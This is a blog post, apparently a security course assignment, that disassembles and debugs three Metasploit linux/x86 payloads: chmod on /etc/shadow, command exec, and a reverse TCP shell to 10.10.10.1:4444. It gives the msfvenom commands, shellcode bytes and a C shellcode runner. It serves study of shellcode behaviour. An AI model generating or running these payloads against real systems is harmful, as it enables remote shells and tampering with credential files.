---
layout: single 
title:  "Metasploit Shellcode Analysis"
date:   2020-03-19 11:08:36 +0800
categories: jekyll update
---

The next assigment is to dissecting the functionality of three shellcode samples created using MSF payloads for linux/x86 using GDB/ndisasm/libemu.

## Requirements

- Take up at least 3 shellcode samples created using Msfpayload for linux/x86
- Use GDB/Ndisasm/Libemu to dissect the functionality of the shellcode

## 1. linux/x86/chmod

This shellcode will runs `chmod` on specified file with specified mode.
To get the list options of `linux/x86/chmod` see below.
As default the parameter `FILE` is set to `/etc/shadow` and parameter `MODE` is set to `0666`.

{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/msfvenom$ msfvenom -p linux/x86/chmod --list-options
Options for payload/linux/x86/chmod:
=========================

       Name: Linux Chmod
     Module: payload/linux/x86/chmod
   Platform: Linux
       Arch: x86
Needs Admin: No
 Total size: 36
       Rank: Normal

Provided by:
    kris katterjohn <katterjohn@gmail.com>

Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
FILE  /etc/shadow      yes       Filename to chmod
MODE  0666             yes       File mode (octal)

Description:
  Runs chmod on specified file with specified mode
{% endhighlight %}

let's try generate the `chmod` shellcode and pipe it into `ndiasasm` to generate the asm code:

{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/msfvenom$ msfvenom -p linux/x86/chmod -f raw | ndisasm -u -
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 36 bytes
{% endhighlight %}

{% highlight nasm linenos %}
00000000  99                cdq

00000001  6A0F              push byte +0xf
00000003  58                pop eax
00000004  52                push edx
00000005  E80C000000        call 0x16
0000000A  2F                das
0000000B  657463            gs jz 0x71
0000000E  2F                das
0000000F  7368              jnc 0x79
00000011  61                popa
00000012  646F              fs outsd
00000014  7700              ja 0x16
00000016  5B                pop ebx
00000017  68B6010000        push dword 0x1b6
0000001C  59                pop ecx
0000001D  CD80              int 0x80
0000001F  6A01              push byte +0x1
00000021  58                pop eax
00000022  CD80              int 0x80
{% endhighlight %}

## Analysis using ndiasasm

The shellcode start with `cdq` which will zeroing the `edx` register.

{% highlight nasm %}
00000000  99                cdq  ; xor edx, edx
{% endhighlight %}


then follow with `chmod` syscall argument (`eax` = `0xf`[15])

{% highlight nasm %}
00000001  6A0F              push byte +0xf  ; 0xf = 15
00000003  58                pop eax         ; eax = 0xf ~ chmod
00000004  52                push edx        ; edx = 0
00000005  E80C000000        call 0x16       
{% endhighlight %}

In Ubuntu we can check:
{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/msfvenom$ grep " 15$" /usr/include/i386-linux-gnu/asm/unistd_32.h 
#define __NR_chmod               15
{% endhighlight %}

From [man 2 chmod](http://man7.org/linux/man-pages/man2/chmod.2.html), `chmod()` changes the mode of the file specified whose `pathname` is given in `pathname`, which is dereferenced if it is a symbolic link.

The format of `chmod`:
```
int chmod(const char *pathname, mode_t mode);
```

In this case for `linux/x86/chmod` payload the registers will looks like: 
- `eax` = `0xf` ~ 15
- `ebx` = path name ~ default `/etc/shadow`
- `ecx` = mode in octal ~ default 0666

{% highlight nasm %}
0000000A  2F                das
0000000B  657463            gs jz 0x71
0000000E  2F                das
0000000F  7368              jnc 0x79
00000011  61                popa
00000012  646F              fs outsd
00000014  7700              ja 0x16
{% endhighlight %}

If we combine the sequence of bytes from above code (`2F 657463 2F 7368 61 646F 7700`), we can convert to ascii by using python, it become `/etc/shadow\x00` which is the path name argument of `chmod()`.

{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/msfvenom$ python3 -c 'print(bytes.fromhex("2F6574632F736861646F7700"))'
b'/etc/shadow\x00'
{% endhighlight %}

The instruction after the `/etc/shadow` string is `pop ebx` which will store the `/etc/shadow` in to `ebx` register that will use to call `chmod()` syscall.

{% highlight nasm %}
00000016  5B                pop ebx
00000017  68B6010000        push dword 0x1b6
0000001C  59                pop ecx
0000001D  CD80              int 0x80
{% endhighlight %}

The file mode which is in octal set on `ecx` register, in this case 666 which is the default of `linux/x86/chmod` payload.
To get the octal number from hex:

{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/msfvenom$ python3 -c "print(oct(0x1b6))"
0o666
{% endhighlight %}

and the `chmod()` syscall get called by `int 0x80`, and here is the final command:
```
chmod('/etc/shadow', 0666)
```

and the last block is the `exit()` syscall (`0x1`).
{% highlight nasm %}
0000001F  6A01              push byte +0x1
00000021  58                pop eax
00000022  CD80              int 0x80
{% endhighlight %}

## 2. linux/x86/exec

This `linux/x86/exec` payload will execute the command using `execve()` syscall. To get the list of options of this payload:

{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/msfvenom$ msfvenom -p linux/x86/exec --list-options
Options for payload/linux/x86/exec:
=========================

       Name: Linux Execute Command
     Module: payload/linux/x86/exec
   Platform: Linux
       Arch: x86
Needs Admin: No
 Total size: 36
       Rank: Normal

Provided by:
    vlad902 <vlad902@gmail.com>

Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
CMD                    yes       The command string to execute

Description:
  Execute an arbitrary command
{% endhighlight %}

Generate payload with format C

{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/msfvenom$  msfvenom -p linux/x86/exec CMD=/bin/pwd -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 44 bytes
Final size of c file: 209 bytes
unsigned char buf[] =
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x09\x00\x00\x00\x2f"
"\x62\x69\x6e\x2f\x70\x77\x64\x00\x57\x53\x89\xe1\xcd\x80";
{% endhighlight %}

And then put it into below C code

{% highlight c linenos %}
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x09\x00\x00\x00\x2f"
"\x62\x69\x6e\x2f\x70\x77\x64\x00\x57\x53\x89\xe1\xcd\x80";

int main()
{
   int (*ret)() = (int(*)()) code;
   ret();
}
{% endhighlight %}

## Analysis using gdb

Compile the C code

{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/msfvenom$ gcc -fno-stack-protector -z execstack exec.c -o exec
{% endhighlight %}

Run the GDB, i've installed plugin for GDB which is [peda](https://github.com/longld/peda), peda is a Python GDB script with many handy commands to help speed up exploit development process on Linux/Unix.
To install peda:
{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/msfvenom$ git clone https://github.com/longld/peda.git ~/peda
kecebong@ubuntu:~/slae32/assigment/msfvenom$ echo "source ~/peda/peda.py" >> ~/.gdbinit
{% endhighlight %}

and start GDB to debug. create the first breakpoint on `*&code`, and start the program with `run`, we can see the stack and registers value before the shellcode execute.

{% highlight nasm %}
kecebong@ubuntu:~/slae32/assigment/msfvenom$ gdb -q ./exec 
Reading symbols from /mnt/hgfs/slae32/assigment/msfvenom/exec...(no debugging symbols found)...done.

gdb-peda$ break *&code
gdb-peda$ run
[----------------------------------registers-----------------------------------]
EAX: 0x804a040 --> 0x99580b6a 
EBX: 0xb7fd0ff4 --> 0x1a7d7c 
ECX: 0xbffff6f4 --> 0xbffff81d ("/mnt/hgfs/slae32/assigment/msfvenom/exec")
EDX: 0xbffff684 --> 0xb7fd0ff4 --> 0x1a7d7c 
ESI: 0x0 
EDI: 0x0 
EBP: 0xbffff658 --> 0x0 
ESP: 0xbffff63c --> 0x80483cb (<main+23>:       leave)
EIP: 0x804a040 --> 0x99580b6a
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a03a <__dso_handle+22>: add    BYTE PTR [eax],al
   0x804a03c <__dso_handle+24>: add    BYTE PTR [eax],al
   0x804a03e <__dso_handle+26>: add    BYTE PTR [eax],al
=> 0x804a040 <code>:    push   0xb
   0x804a042 <code+2>:  pop    eax
   0x804a043 <code+3>:  cdq    
   0x804a044 <code+4>:  push   edx
   0x804a045 <code+5>:  pushw  0x632d
[------------------------------------stack-------------------------------------]
0000| 0xbffff63c --> 0x80483cb (<main+23>:      leave)
0004| 0xbffff640 --> 0xb7fed230 (push   ebp)
0008| 0xbffff644 --> 0x0 
0012| 0xbffff648 --> 0x80483d9 (<__libc_csu_init+9>:    add    ebx,0x1c1b)
0016| 0xbffff64c --> 0x804a040 --> 0x99580b6a 
0020| 0xbffff650 --> 0x80483d0 (<__libc_csu_init>:      push   ebp)
0024| 0xbffff654 --> 0x0 
0028| 0xbffff658 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804a040 in code ()
{% endhighlight %}

and we can see the asm code of the `linux/x86/exec` payload using `dissasemble`

{% highlight nasm linenos %}
gdb-peda$ disassemble 
Dump of assembler code for function code:
=> 0x0804a040 <+0>:     push   0xb
   0x0804a042 <+2>:     pop    eax
   0x0804a043 <+3>:     cdq    
   0x0804a044 <+4>:     push   edx
   0x0804a045 <+5>:     pushw  0x632d
   0x0804a049 <+9>:     mov    edi,esp
   0x0804a04b <+11>:    push   0x68732f
   0x0804a050 <+16>:    push   0x6e69622f
   0x0804a055 <+21>:    mov    ebx,esp
   0x0804a057 <+23>:    push   edx
   0x0804a058 <+24>:    call   0x804a066 <code+38>
   0x0804a05d <+29>:    das    
   0x0804a05e <+30>:    bound  ebp,QWORD PTR [ecx+0x6e]
   0x0804a061 <+33>:    das    
   0x0804a062 <+34>:    jo     0x804a0db
   0x0804a064 <+36>:    add    BYTE PTR fs:[edi+0x53],dl
   0x0804a068 <+40>:    mov    ecx,esp
   0x0804a06a <+42>:    int    0x80
   0x0804a06c <+44>:    add    BYTE PTR [eax],al
End of assembler dump.
{% endhighlight %}

the second breakpoint is on `0x0804a044` and `continue`. From here we can see that the line 3-5 are setting the `eax` and `edx` registers.
- `eax` : `0xb` (`pop eax`) - `execve` syscall
- `edx` : `0x0` - [`cdq`] 

we can check the linux syscall number by running the following command:

{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/msfvenom$ python3 -c "print(int(0xb))"
11

kecebong@ubuntu:~/slae32/assigment/msfvenom$ grep " 11$" /usr/include/i386-linux-gnu/asm/unistd_32.h 
#define __NR_execve              11
{% endhighlight %}

see below output, we can see the registers, code and the stack content:

{% highlight nasm %}
[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0xb7fd0ff4 --> 0x1a7d7c 
ECX: 0xbffff6f4 --> 0xbffff81d ("/mnt/hgfs/slae32/assigment/msfvenom/exec")
EDX: 0x0 
ESI: 0x0 
EDI: 0x0 
EBP: 0xbffff658 --> 0x0 
ESP: 0xbffff63c --> 0x80483cb (<main+23>:       leave)
EIP: 0x804a044 ("Rfh-c\211\347h/sh")
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a03f <__dso_handle+27>: add    BYTE PTR [edx+0xb],ch
   0x804a042 <code+2>:  pop    eax
   0x804a043 <code+3>:  cdq    
=> 0x804a044 <code+4>:  push   edx
   0x804a045 <code+5>:  pushw  0x632d
   0x804a049 <code+9>:  mov    edi,esp
   0x804a04b <code+11>: push   0x68732f
   0x804a050 <code+16>: push   0x6e69622f
[------------------------------------stack-------------------------------------]
0000| 0xbffff63c --> 0x80483cb (<main+23>:      leave)
0004| 0xbffff640 --> 0xb7fed230 (push   ebp)
0008| 0xbffff644 --> 0x0 
0012| 0xbffff648 --> 0x80483d9 (<__libc_csu_init+9>:    add    ebx,0x1c1b)
0016| 0xbffff64c --> 0x804a040 --> 0x99580b6a 
0020| 0xbffff650 --> 0x80483d0 (<__libc_csu_init>:      push   ebp)
0024| 0xbffff654 --> 0x0 
0028| 0xbffff658 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x0804a044 in code ()
{% endhighlight %}

let's create another breakpoint on `0x804a058` and `continue`. From here we can see that line 6-13 are pushing the following into stack:
- `0x0`  - [`push edx`]
- `"c-"` - [`pushw  0x632d`]
- `hs/`  - [`push   0x68732f`]
- `nib/` - [`push   0x6e69622f`] 
- `0x0`  - [`push   edx`]

at this stage `ebx` is pointing to `esp` which is top of the stack [`mov    ebx,esp`]

we can run the following command to translate the hex into string:

{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/msfvenom$ python3 -c "print(bytes.fromhex('632d'))"
b'c-'
kecebong@ubuntu:~/slae32/assigment/msfvenom$ python3 -c "print(bytes.fromhex('68732f'))"
b'hs/'
kecebong@ubuntu:~/slae32/assigment/msfvenom$ python3 -c "print(bytes.fromhex('6e69622f'))"
b'nib/'
{% endhighlight %}

See the stack section below:

{% highlight nasm %}
gdb-peda$ break *0x804a058
gdb-peda$ continue

[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0xbffff62e ("/bin/sh")
ECX: 0xbffff6f4 --> 0xbffff81d ("/mnt/hgfs/slae32/assigment/msfvenom/exec")
EDX: 0x0 
ESI: 0x0 
EDI: 0xbffff636 --> 0x632d ('-c')
EBP: 0xbffff658 --> 0x0 
ESP: 0xbffff62a --> 0x0 
EIP: 0x804a058 --> 0x9e8
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a050 <code+16>: push   0x6e69622f
   0x804a055 <code+21>: mov    ebx,esp
   0x804a057 <code+23>: push   edx
=> 0x804a058 <code+24>: call   0x804a066 <code+38>
   0x804a05d <code+29>: das    
   0x804a05e <code+30>: bound  ebp,QWORD PTR [ecx+0x6e]
   0x804a061 <code+33>: das    
   0x804a062 <code+34>: jo     0x804a0db
Guessed arguments:
arg[0]: 0x0 
arg[1]: 0x6e69622f ('/bin')
arg[2]: 0x68732f ('/sh')
arg[3]: 0x632d ('-c')
arg[4]: 0x83cb0000 
[------------------------------------stack-------------------------------------]
0000| 0xbffff62a --> 0x0 
0004| 0xbffff62e ("/bin/sh")
0008| 0xbffff632 --> 0x68732f ('/sh')
0012| 0xbffff636 --> 0x632d ('-c')
0016| 0xbffff63a --> 0x83cb0000 
0020| 0xbffff63e --> 0xd2300804 
0024| 0xbffff642 --> 0xb7fe 
0028| 0xbffff646 --> 0x83d90000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x0804a058 in code ()
{% endhighlight %}

after that we continue to create another breakpoint on `0x0804a06a`. we can see that line 14-20 are pushing the following into stack:
- `/bin/sh`
- `-c`
- `/etc/pwd`
- `0x0`

and `ecx` register is pointing to `esp` which is the top of the stack and this is the 2nd argument of `execve()` syscall which is the `char *const argv[]`.
For more details see the output below on the stack section:

{% highlight nasm %}
gdb-peda$ break *0x0804a06a
gdb-peda$ continue
[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0xbffff62e ("/bin/sh")
ECX: 0xbffff61e --> 0xbffff62e ("/bin/sh")
EDX: 0x0 
ESI: 0x0 
EDI: 0xbffff636 --> 0x632d ('-c')
EBP: 0xbffff658 --> 0x0 
ESP: 0xbffff61e --> 0xbffff62e ("/bin/sh")
EIP: 0x804a06a --> 0x80cd
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a062 <code+34>: jo     0x804a0db
   0x804a064 <code+36>: add    BYTE PTR fs:[edi+0x53],dl
   0x804a068 <code+40>: mov    ecx,esp
=> 0x804a06a <code+42>: int    0x80
   0x804a06c <code+44>: add    BYTE PTR [eax],al
   0x804a06e:   add    BYTE PTR [eax],al
   0x804a070 <completed.6159>:  add    BYTE PTR [eax],al
   0x804a072:   add    BYTE PTR [eax],al
[------------------------------------stack-------------------------------------]
0000| 0xbffff61e --> 0xbffff62e ("/bin/sh")
0004| 0xbffff622 --> 0xbffff636 --> 0x632d ('-c')
0008| 0xbffff626 --> 0x804a05d ("/bin/pwd")
0012| 0xbffff62a --> 0x0 
0016| 0xbffff62e ("/bin/sh")
0020| 0xbffff632 --> 0x68732f ('/sh')
0024| 0xbffff636 --> 0x632d ('-c')
0028| 0xbffff63a --> 0x83cb0000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x0804a06a in code ()
{% endhighlight %}

after all arguments are set, then the next instruction is `int 0x80` which is calling the `execve()` syscall. So the full syntax:
{% highlight c %}
execve('/bin/sh', ['/bin/sh', '-c', '/bin/pwd'])
{% endhighlight %}

as we can see the output below, `/mnt/hgfs/slae32/assigment/msfvenom` is the `pwd` command output.
{% highlight nasm %}
gdb-peda$ si
process 2391 is executing new program: /bin/bash
process 2391 is executing new program: /bin/pwd
/mnt/hgfs/slae32/assigment/msfvenom
[Inferior 1 (process 2391) exited normally]
{% endhighlight %}

## 3. linux/x86/shell_reverse_tcp

This shellcode will create shell reverse tcp which will connect to the attacker box and spawn a command shell. To check the list of options for this payload see below:

{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/msfvenom$ msfvenom -p linux/x86/shell_reverse_tcp --list-options
Options for payload/linux/x86/shell_reverse_tcp:
=========================

       Name: Linux Command Shell, Reverse TCP Inline
     Module: payload/linux/x86/shell_reverse_tcp
   Platform: Linux
       Arch: x86
Needs Admin: No
 Total size: 68
       Rank: Normal

Provided by:
    Ramon de C Valle <rcvalle@metasploit.com>
    joev <joev@metasploit.com>

Basic options:
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
CMD    /bin/sh          yes       The command string to execute
LHOST                   yes       The listen address (an interface may be specified)
LPORT  4444             yes       The listen port

Description:
  Connect back to attacker and spawn a command shell
{% endhighlight %}

From the above output we can see that the default value for
- `CMD`   = `/bin/sh`
- `LHOST` = not set 
- `LPORT` = `4444`

let's try to generate the payload with the `LHOST` = `10.10.10.1`.

{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/msfvenom$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.1 -f raw | ndisasm -u -
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
{% endhighlight %}

the asm code of `linux/x86/shell_reverse_tcp LHOST=10.10.10.1` payload
{% highlight nasm linenos %}
00000000  31DB              xor ebx,ebx
00000002  F7E3              mul ebx
00000004  53                push ebx
00000005  43                inc ebx
00000006  53                push ebx
00000007  6A02              push byte +0x2
00000009  89E1              mov ecx,esp
0000000B  B066              mov al,0x66
0000000D  CD80              int 0x80
0000000F  93                xchg eax,ebx
00000010  59                pop ecx
00000011  B03F              mov al,0x3f
00000013  CD80              int 0x80
00000015  49                dec ecx
00000016  79F9              jns 0x11
00000018  680A0A0A01        push dword 0x10a0a0a
0000001D  680200115C        push dword 0x5c110002
00000022  89E1              mov ecx,esp
00000024  B066              mov al,0x66
00000026  50                push eax
00000027  51                push ecx
00000028  53                push ebx
00000029  B303              mov bl,0x3
0000002B  89E1              mov ecx,esp
0000002D  CD80              int 0x80
0000002F  52                push edx
00000030  686E2F7368        push dword 0x68732f6e
00000035  682F2F6269        push dword 0x69622f2f
0000003A  89E3              mov ebx,esp
0000003C  52                push edx
0000003D  53                push ebx
0000003E  89E1              mov ecx,esp
00000040  B00B              mov al,0xb
00000042  CD80              int 0x80
{% endhighlight %}

## Analysis using ndisasm/libemu

To analyze i use `ndisasm` and `libemu`. To install `libemu` ([more info](http://libemu.carnivore.it/)).

{% highlight console %}
# install the require package
kecebong@ubuntu:~$ sudo apt-get install git autoconf libtool

# clone the libemu
kecebong@ubuntu:~$ git clone https://github.com/buffer/libemu

# configure and install
kecebong@ubuntu:~$ autoreconf -v -i
kecebong@ubuntu:~$ ./configure --prefix=/opt/libemu
kecebong@ubuntu:~$ sudo make install
{% endhighlight %}

After the `libemu` installed, let's start to analyze the shellcode.

The shellcode start with zeroing the `ebx` and `eax` registers.

{% highlight nasm %}
00000000  31DB              xor ebx,ebx      ; ebx = 0x0
00000002  F7E3              mul ebx          ; eax = 0x0
{% endhighlight %}  

and then continue with `socketcall()` syscall, which will creating the socket.

{% highlight nasm %}
00000004  53                push ebx         ; 0x0
00000005  43                inc ebx     
00000006  53                push ebx         ; ebx = 0x1 
00000007  6A02              push byte +0x2   ; 0x2
00000009  89E1              mov ecx,esp
0000000B  B066              mov al,0x66      ; eax = 0x66
0000000D  CD80              int 0x80
{% endhighlight %}

to get the syscall number:

{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/msfvenom$ python3 -c "print(int(0x66))"
102
kecebong@ubuntu:~/slae32/assigment/msfvenom$ grep 102 /usr/include/i386-linux-gnu/asm/unistd_32.h
#define __NR_socketcall         102
{% endhighlight %}

The `socketcall()` syscall need the following registers:

- EAX : socketcall (0x66)
- EBX : SYS_SOCKET (0x01)
- ECX : (AF_INET, SOCK_STREAM, 0)
  - AF_INET : 0x02
  - SOCK_STREAM : 0x01
  - protocol : 0x00

The `socketcall()` syscall return the value on `eax` register, because `eax` register will be use for the next syscall, we need to store it in another register, in this case is `ebx` register with instruction `xchg eax,ebx`. And this `ebx` will use by `dup2` syscall. `dup2` syscall use to duplicate a file descriptor. The syntax of `dup2()`:
```
int dup2(int oldfd, int newfd);
```

and the registers needed to call `dup2()`:
- `eax` : `0x3f`
- `ebx` : `oldfd` - the return socket of `socketcall()` syscall above
- `ecx` : `newfd` 

to get the syscall number on ubuntu:

{% highlight console %}
kecebong@ubuntu:~/libemu$ python3 -c "print(int(0x3f))"
63

kecebong@ubuntu:~/libemu$ grep " 63$" /usr/include/i386-linux-gnu/asm/unistd_32.h 
#define __NR_dup2                63
{% endhighlight %}

the below block instructions are the loop to copy the socket file descriptor (which created on previous instructions) to `stdin`, `stdout` and `stderr`, so when it connected to the remote host, the outpu
- iter 1 : `dup2(oldfd, 2)` - stderr
- iter 2 : `dup2(oldfd, 1)` - stdout
- iter 3 : `dup2(oldfd, 0)` - stdin

{% highlight nasm %}
0000000F  93                xchg eax,ebx
00000010  59                pop ecx
00000011  B03F              mov al,0x3f
00000013  CD80              int 0x80

00000015  49                dec ecx
00000016  79F9              jns 0x11
{% endhighlight %}





{% highlight nasm %}
00000018  680A0A0A01        push dword 0x10a0a0a
0000001D  680200115C        push dword 0x5c110002
00000022  89E1              mov ecx,esp
00000024  B066              mov al,0x66
00000026  50                push eax
00000027  51                push ecx
00000028  53                push ebx
00000029  B303              mov bl,0x3
0000002B  89E1              mov ecx,esp
0000002D  CD80              int 0x80
{% endhighlight %}

and then the `execve()` syscall:

{% highlight nasm %}
0000002F  52                push edx
00000030  686E2F7368        push dword 0x68732f6e  ; "hs/n"
00000035  682F2F6269        push dword 0x69622f2f  ; "ib//"
0000003A  89E3              mov ebx,esp
0000003C  52                push edx
0000003D  53                push ebx
0000003E  89E1              mov ecx,esp
00000040  B00B              mov al,0xb             ; execve
00000042  CD80              int 0x80
{% endhighlight %}

we can check the linux syscall number by running the following command:

{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/msfvenom$ python3 -c "print(int(0xb))"
11

kecebong@ubuntu:~/slae32/assigment/msfvenom$ grep " 11$" /usr/include/i386-linux-gnu/asm/unistd_32.h 
#define __NR_execve              11
{% endhighlight %}

If we convert the hex number for the two `push dword` instructions above, we can see that the argument of `execve()` which is `//bin/sh`.

{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/msfvenom$ python3 -c "print(bytes.fromhex('68732f6e69622f2f'))"
b'hs/nib//'
{% endhighlight %}

Generate `libemu` callgraph of the shellcode we generate with metasploit:

{% highlight c %}
kecebong@ubuntu:~/slae32/assigment/msfvenom$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.1 -f raw | \
sctest -v -S -s 99999 -G reverse.dot && dot reverse.dot -T png -o reverse.png
graph file reverse.dot
verbose = 1
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
int socket(int domain=2, int type=1, int protocol=0);
int dup2(int oldfd=14, int newfd=2);
int dup2(int oldfd=14, int newfd=1);
int dup2(int oldfd=14, int newfd=0);
connect
execve
int execve (const char *dateiname=00416fa6={//bin/sh}, const char * argv[], const char *envp[]);
cpu error error accessing 0x00000004 not mapped

stepcount 42
copying vertexes
optimizing graph
...
int socket (
     int domain = 2;
     int type = 1;
     int protocol = 0;
) =  14;
int dup2 (
     int oldfd = 14;
     int newfd = 2;
) =  2;
int dup2 (
     int oldfd = 14;
     int newfd = 1;
) =  1;
int dup2 (
     int oldfd = 14;
     int newfd = 0;
) =  0;
int connect (
     int sockfd = 14;
     struct sockaddr_in * serv_addr = 0x00416fbe =>
         struct   = {
             short sin_family = 2;
             unsigned short sin_port = 23569 (port=4444);
             struct in_addr sin_addr = {
                 unsigned long s_addr = 17435146 (host=10.10.10.1);
             };
             char sin_zero = "       ";
         };
     int addrlen = 102;
) =  0;
int execve (
     const char * dateiname = 0x00416fa6 =>
           = "//bin/sh";
     const char * argv[] = [
           = 0x00416f9e =>
               = 0x00416fa6 =>
                   = "//bin/sh";
           = 0x00000000 =>
             none;
     ];
     const char * envp[] = 0x00000000 =>
         none;
) =  0;
{% endhighlight %}


The `libemu` graph output is quite easy to understand:

![image](/assets/img/assigment5_reverse.png)

